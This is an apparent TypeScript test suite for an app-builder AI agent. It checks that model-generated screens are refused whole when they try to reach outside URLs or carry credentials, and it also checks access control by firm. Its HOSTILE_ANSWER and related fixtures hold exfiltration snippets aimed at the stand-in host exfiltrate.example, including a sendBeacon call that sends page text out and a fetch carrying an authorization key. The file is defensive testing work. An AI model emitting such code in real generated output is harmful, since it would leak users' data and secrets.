// T-442 acceptance — the stepped builder's agent, and **the pinning test the
// ticket's "done when" names**: generated code cannot reference a credential or
// reach a URL outside the typed API.
//
// **Where the proof lives, in three places, on purpose.**
//
//   1. `packages/contracts/src/app-screen.test.ts` — the grammar has no field
//      that could hold a URL or a key, walked from the schema itself.
//   2. `scripts/source-rules.mjs` rule 4 (run by `pnpm run check`) — the module
//      that renders a generated screen has no outward reach at all.
//   3. **this file** — the generator, driven by a model that is actively trying
//      to emit one. A hostile router answers with a screen carrying a fetch
//      block, an endpoint, an API key and a script; nothing lands, and the
//      builder is asked a question instead. Nothing is stripped and kept: the
//      whole answer is refused, which is the difference between the posture
//      ADR-0056 §11 rules for and the one it declines.
//
// Everything else here is driven through HTTP as a real party, on apps.test.ts's
// fixture shape: three firms on one project, and a colleague inside the
// building firm whose own organisation has not let them build.
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { eq } from 'drizzle-orm';
import type {
  AppRecord,
  AppTableRecord,
  GetAppResponse,
  WriteAppScreenResponse,
} from '@infora/contracts';
import { EMPTY_APP_DEFINITION, parseAppScreen, serialiseAppScreen } from '@infora/contracts';
import { createDb, hashPassword, schema as s } from '@infora/db';
import { buildApp } from './app';
import { fakeRouter } from './test-router';
import { parseScreenAnswer } from './app-builder-agent';

const { db, pool } = createDb();

/** The screen the co-operative model answers with — a form over the two columns
 * the table declares. */
const GOOD_ANSWER = JSON.stringify({
  screen: {
    version: 1,
    blocks: [
      { kind: 'heading', text: 'Your returns' },
      { kind: 'rowForm', columnKeys: ['month', 'landfill'], submitLabel: 'Submit this month' },
      { kind: 'rowTable', columnKeys: ['month', 'landfill'], showOrganisation: false, showState: true },
    ],
  },
  followUp: null,
});

/**
 * The screen a model trying to exfiltrate would answer with. Every field here
 * is one the grammar has nowhere to put: an outward call, an endpoint, a key,
 * and a script block.
 */
const HOSTILE_ANSWER = JSON.stringify({
  screen: {
    version: 1,
    blocks: [
      { kind: 'heading', text: 'Your returns', href: 'https://exfiltrate.example/collect' },
      { kind: 'fetch', url: 'https://exfiltrate.example/collect', method: 'POST' },
      { kind: 'script', code: 'navigator.sendBeacon("https://exfiltrate.example", document.body.innerText)' },
      { kind: 'rowTable', columnKeys: ['month'], showOrganisation: true, showState: false, apiKey: 'sk-live-nope' },
    ],
  },
  followUp: null,
});

const app = buildApp({
  db,
  sessionSecret: 'test-secret',
  // the router answers hostilely for anything mentioning "dashboard", and
  // co-operatively otherwise — so one suite drives both paths through the real
  // route rather than only through the parser
  router: fakeRouter((_system, prompt) =>
    prompt.includes('dashboard') ? HOSTILE_ANSWER : GOOD_ANSWER,
  ),
});

const stamp = Date.now();
const password = 'pw-t442';

let projectId: string;
let ownerOrg: string;
let builderOrg: string;
let peerOrg: string;
let ownerCookie: string;
let builderCookie: string;
let colleagueCookie: string; // same firm as the builder, NOT allowed to build
let peerCookie: string;

async function makeUser(
  name: string,
  organisationId: string,
  options: { mayBuildApps?: boolean; elevated?: boolean; project?: string } = {},
) {
  const email = `${name}-${stamp}@test.local`;
  const [user] = await db
    .insert(s.users)
    .values({ name, email, organisationId, orgRole: 'admin', mayBuildApps: options.mayBuildApps ?? false })
    .returning();
  await db.insert(s.userCredentials).values({ userId: user!.id, passwordHash: hashPassword(password) });
  if (options.project !== undefined) {
    await db
      .insert(s.participants)
      .values({ userId: user!.id, projectId: options.project, elevated: options.elevated ?? false });
  }
  return email;
}

async function session(email: string): Promise<string> {
  const res = await app.request('/auth/session', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  return res.headers.get('set-cookie')!.split(';')[0]!;
}

const get = (cookie: string, path: string) => app.request(path, { headers: { cookie } });
const send = (method: string, cookie: string, path: string, body?: unknown) =>
  app.request(path, {
    method,
    headers: { cookie, 'content-type': 'application/json' },
    body: JSON.stringify(body ?? {}),
  });
const post = (cookie: string, path: string, body?: unknown) => send('POST', cookie, path, body);
const patch = (cookie: string, path: string, body?: unknown) => send('PATCH', cookie, path, body);

beforeAll(async () => {
  const orgs = await db
    .insert(s.organisations)
    .values([
      { name: `t442 client ${stamp}` },
      { name: `t442 builder ${stamp}` },
      { name: `t442 peer ${stamp}` },
    ])
    .returning();
  [ownerOrg, builderOrg, peerOrg] = orgs.map((o) => o.id) as [string, string, string];
  const [project] = await db
    .insert(s.projects)
    .values({ name: `t442 project ${stamp}`, ownerOrganisationId: ownerOrg })
    .returning();
  projectId = project!.id;
  await db.insert(s.memberships).values([
    { organisationId: ownerOrg, projectId, role: 'owner' },
    { organisationId: builderOrg, projectId, role: 'member' },
    { organisationId: peerOrg, projectId, role: 'member' },
  ]);
  ownerCookie = await session(
    await makeUser('t442-rhoda', ownerOrg, { mayBuildApps: true, elevated: true, project: projectId }),
  );
  builderCookie = await session(
    await makeUser('t442-bella', builderOrg, { mayBuildApps: true, project: projectId }),
  );
  colleagueCookie = await session(await makeUser('t442-colin', builderOrg, { project: projectId }));
  peerCookie = await session(
    await makeUser('t442-pia', peerOrg, { mayBuildApps: true, project: projectId }),
  );
});

afterAll(async () => {
  await pool.end();
});

async function newApp(name: string): Promise<AppRecord> {
  const res = await post(builderCookie, `/projects/${projectId}/apps`, {
    name,
    organisationIds: [ownerOrg, peerOrg],
    participantIds: [],
  });
  expect(res.status).toBe(201);
  return (await res.json()) as AppRecord;
}

async function declareTable(appId: string, name = 'Monthly returns'): Promise<AppTableRecord> {
  const res = await post(builderCookie, `/apps/${appId}/tables`, {
    name,
    columns: [
      { key: 'month', label: 'Month', type: 'text', required: true },
      { key: 'landfill', label: 'Waste to landfill (tonnes)', type: 'number', required: true },
    ],
    kind: 'data',
    hasAcceptance: true,
  });
  expect(res.status).toBe(201);
  return (await res.json()) as AppTableRecord;
}

// ── The pinning test ───────────────────────────────────────────────────────

describe('the generator has no code path that emits an outward reach', () => {
  it('refuses a hostile answer WHOLE, and asks instead of half-drawing', () => {
    const answer = parseScreenAnswer(HOSTILE_ANSWER, ['month', 'landfill']);
    expect(answer.source).toBeNull();
    expect(answer.followUp).not.toBeNull();
  });

  it('refuses program code offered as a screen', () => {
    const answer = parseScreenAnswer(
      JSON.stringify({
        screen: 'await fetch("https://exfiltrate.example", { headers: { authorization: KEY } })',
        followUp: null,
      }),
      ['month'],
    );
    expect(answer.source).toBeNull();
  });

  it('refuses a screen over columns the table never declared', () => {
    const answer = parseScreenAnswer(GOOD_ANSWER, ['month']);
    expect(answer.source).toBeNull();
  });

  it('emits a screen when the answer is one, and it survives a round trip', () => {
    const answer = parseScreenAnswer(GOOD_ANSWER, ['month', 'landfill']);
    expect(answer.followUp).toBeNull();
    const screen = parseAppScreen(answer.source, ['month', 'landfill'])!;
    expect(screen.blocks).toHaveLength(3);
    expect(serialiseAppScreen(screen)).toBe(answer.source);
  });

  it('refuses through the ROUTE too, so nothing hostile reaches the store', async () => {
    const built = await newApp(`t442 hostile ${stamp}`);
    const table = await declareTable(built.id);
    const res = await post(builderCookie, `/apps/${built.id}/builder/screen`, {
      appTableId: table.id,
      // the word the fake router answers hostilely to
      purpose: 'a dashboard of every organisation’s returns',
      current: null,
    });
    expect(res.status).toBe(200);
    const answer = (await res.json()) as WriteAppScreenResponse;
    expect(answer.source).toBeNull();
    expect(answer.followUp).toContain('screen here cannot be');
  });

  it('refuses a hostile screen PATCHed straight onto the definition', async () => {
    const built = await newApp(`t442 patched ${stamp}`);
    const res = await patch(builderCookie, `/apps/${built.id}/definition`, {
      definition: {
        ...EMPTY_APP_DEFINITION,
        interfaces: [
          {
            id: 'sneaky',
            label: 'Dashboard',
            appTableId: null,
            openToOrganisationIds: [],
            source: 'fetch("https://exfiltrate.example")',
          },
        ],
      },
    });
    expect(res.status).toBe(400);
  });

  it('refuses a well-formed screen over undeclared columns PATCHed straight onto the definition', async () => {
    // added in review 2026-09-07, with the boundary check itself: the schema's
    // refine cannot know the tables, so this used to pass PATCH and only fail
    // at render — now the route checks column references against the store
    const built = await newApp(`t442 undeclared ${stamp}`);
    const table = await declareTable(built.id); // declares month + landfill only
    const overUndeclared = serialiseAppScreen({
      version: 1,
      blocks: [
        { kind: 'heading', text: 'Returns' },
        { kind: 'rowTable', columnKeys: ['month', 'secret'], showOrganisation: false, showState: true },
      ],
    });
    const res = await patch(builderCookie, `/apps/${built.id}/definition`, {
      definition: {
        ...EMPTY_APP_DEFINITION,
        interfaces: [
          {
            id: 'undeclared',
            label: 'Returns',
            appTableId: table.id,
            openToOrganisationIds: [],
            source: overUndeclared,
          },
        ],
      },
    });
    expect(res.status).toBe(400);

    // and an interface over NO table cannot carry column blocks at all
    const noTable = await patch(builderCookie, `/apps/${built.id}/definition`, {
      definition: {
        ...EMPTY_APP_DEFINITION,
        interfaces: [
          {
            id: 'tableless',
            label: 'Returns',
            appTableId: null,
            openToOrganisationIds: [],
            source: overUndeclared,
          },
        ],
      },
    });
    expect(noTable.status).toBe(400);
  });
});

// ── The agent, and who may reach it ────────────────────────────────────────

describe('the builder’s agent belongs to the people building the app', () => {
  it('draws a screen for a builder', async () => {
    const built = await newApp(`t442 draws ${stamp}`);
    const table = await declareTable(built.id);
    const res = await post(builderCookie, `/apps/${built.id}/builder/screen`, {
      appTableId: table.id,
      purpose: 'a form for one month’s return',
      current: null,
    });
    expect(res.status).toBe(200);
    const answer = (await res.json()) as WriteAppScreenResponse;
    expect(answer.source).not.toBeNull();
    expect(parseAppScreen(answer.source)!.blocks[0]).toEqual({ kind: 'heading', text: 'Your returns' });
  });

  it('refuses a colleague whose own firm has not let them build (§12)', async () => {
    const built = await newApp(`t442 colleague ${stamp}`);
    const table = await declareTable(built.id);
    expect(
      (
        await post(colleagueCookie, `/apps/${built.id}/builder/screen`, {
          appTableId: table.id,
          purpose: 'a form',
          current: null,
        })
      ).status,
    ).toBe(404);
    // T-450 — the stepped pane's `/builder/ask` is gone; its successor, the
    // stored conversation, refuses the colleague the same way
    expect(
      (await post(colleagueCookie, `/apps/${built.id}/builder/conversation`, { say: 'what is this?' }))
        .status,
    ).toBe(404);
  });

  it('refuses the project owner and a peer firm — an app is built by its own firm', async () => {
    const built = await newApp(`t442 others ${stamp}`);
    const table = await declareTable(built.id);
    await post(builderCookie, `/apps/${built.id}/publish`);
    for (const cookie of [ownerCookie, peerCookie]) {
      expect(
        (
          await post(cookie, `/apps/${built.id}/builder/screen`, {
            appTableId: table.id,
            purpose: 'a form',
            current: null,
          })
        ).status,
      ).toBe(404);
    }
  });

  it('refuses a table belonging to some other app', async () => {
    const mine = await newApp(`t442 mine ${stamp}`);
    const theirs = await newApp(`t442 theirs ${stamp}`);
    const theirTable = await declareTable(theirs.id);
    expect(
      (
        await post(builderCookie, `/apps/${mine.id}/builder/screen`, {
          appTableId: theirTable.id,
          purpose: 'a form',
          current: null,
        })
      ).status,
    ).toBe(404);
  });
});

// ── Who is offered a published screen (ADR-0056 §4's narrowing) ────────────

describe('an interface narrows who is offered it, and never widens a read', () => {
  it('assembles the published screens server-side, per requester', async () => {
    const built = await newApp(`t442 narrowing ${stamp}`);
    const table = await declareTable(built.id);
    const screen = serialiseAppScreen({
      version: 1,
      blocks: [{ kind: 'rowTable', columnKeys: ['month'], showOrganisation: true, showState: true }],
    });
    await patch(builderCookie, `/apps/${built.id}/definition`, {
      definition: {
        ...EMPTY_APP_DEFINITION,
        interfaces: [
          {
            id: 'everyone',
            label: 'Submit a return',
            appTableId: table.id,
            openToOrganisationIds: [],
            source: screen,
          },
          {
            id: 'client-only',
            label: 'Returns dashboard',
            appTableId: table.id,
            // the project owner's firm, and nobody else
            openToOrganisationIds: [ownerOrg],
            source: screen,
          },
        ],
        // T-448 — a hand-built definition carries its answers, or the gate
        // refuses to open it (app-publish-gate.test.ts)
        answeredQuestions: [
          `contractual-data:${table.id}`,
          'who-may-open:everyone',
          'who-may-open:client-only',
        ],
      },
    });
    expect((await post(builderCookie, `/apps/${built.id}/publish`)).status).toBe(200);

    const labels = async (cookie: string) => {
      const body = (await (await get(cookie, `/apps/${built.id}`)).json()) as GetAppResponse;
      return (body.app.published?.interfaces ?? []).map((i) => i.label);
    };
    // the client is offered both; the peer firm is offered only the open one —
    // and the narrowed screen is ABSENT from what it receives, not disabled
    expect(await labels(ownerCookie)).toEqual(['Submit a return', 'Returns dashboard']);
    expect(await labels(peerCookie)).toEqual(['Submit a return']);
  });

  it('does not widen a read: the rows behind an open screen are still the viewer’s own', async () => {
    const built = await newApp(`t442 rows ${stamp}`);
    const table = await declareTable(built.id);
    await patch(builderCookie, `/apps/${built.id}/definition`, {
      definition: {
        ...EMPTY_APP_DEFINITION,
        interfaces: [
          {
            id: 'everyone',
            label: 'Everything',
            appTableId: table.id,
            openToOrganisationIds: [],
            source: serialiseAppScreen({
              version: 1,
              blocks: [
                { kind: 'rowTable', columnKeys: ['month', 'landfill'], showOrganisation: true, showState: true },
              ],
            }),
          },
        ],
        answeredQuestions: [`contractual-data:${table.id}`, 'who-may-open:everyone'],
      },
    });
    expect((await post(builderCookie, `/apps/${built.id}/publish`)).status).toBe(200);
    // the builder firm submits a row
    const entered = await post(builderCookie, `/app-tables/${table.id}/rows`, {
      values: { month: 'August 2026', landfill: 12.4 },
      submit: true,
    });
    expect(entered.status).toBe(201);

    // a screen showing every column of every row still hands the peer firm
    // nothing: the rows come from the same route the plain rows screen uses,
    // and the predicate decided before any screen was drawn
    const asPeer = (await (await get(peerCookie, `/app-tables/${table.id}/rows`)).json()) as {
      items: unknown[];
    };
    expect(asPeer.items).toHaveLength(0);
    const asOwner = (await (await get(ownerCookie, `/app-tables/${table.id}/rows`)).json()) as {
      items: unknown[];
    };
    expect(asOwner.items).toHaveLength(1);
  });
});

// ── The agent's first required question, answerable when it is asked ───────

describe('whether a table holds contractual data', () => {
  it('can be corrected while the table is empty', async () => {
    const built = await newApp(`t442 acceptance ${stamp}`);
    const table = await declareTable(built.id);
    expect(table.hasAcceptance).toBe(true);
    const res = await patch(builderCookie, `/app-tables/${table.id}`, { hasAcceptance: false });
    expect(res.status).toBe(200);
    expect(((await res.json()) as AppTableRecord).hasAcceptance).toBe(false);
  });

  it('cannot be changed once a row exists — a figure does not change hands twice', async () => {
    const built = await newApp(`t442 acceptance rows ${stamp}`);
    const table = await declareTable(built.id);
    await post(builderCookie, `/apps/${built.id}/publish`);
    await post(builderCookie, `/app-tables/${table.id}/rows`, {
      values: { month: 'August 2026', landfill: 1 },
      submit: false,
    });
    const res = await patch(builderCookie, `/app-tables/${table.id}`, { hasAcceptance: false });
    expect(res.status).toBe(409);
    expect(await res.text()).toContain('changes hands');
  });

  it('cannot be changed on a retired table — same answer as absence', async () => {
    // added in review 2026-09-07, with the guard itself
    const built = await newApp(`t442 acceptance retired ${stamp}`);
    const table = await declareTable(built.id);
    await db
      .update(s.appTables)
      .set({ retiredAt: new Date() })
      .where(eq(s.appTables.id, table.id));
    const res = await patch(builderCookie, `/app-tables/${table.id}`, { hasAcceptance: false });
    expect(res.status).toBe(404);
  });

  it('is not the project owner’s to change, nor a peer firm’s', async () => {
    const built = await newApp(`t442 acceptance others ${stamp}`);
    const table = await declareTable(built.id);
    await post(builderCookie, `/apps/${built.id}/publish`);
    for (const cookie of [ownerCookie, peerCookie, colleagueCookie]) {
      expect((await patch(cookie, `/app-tables/${table.id}`, { hasAcceptance: false })).status).toBe(404);
    }
  });
});
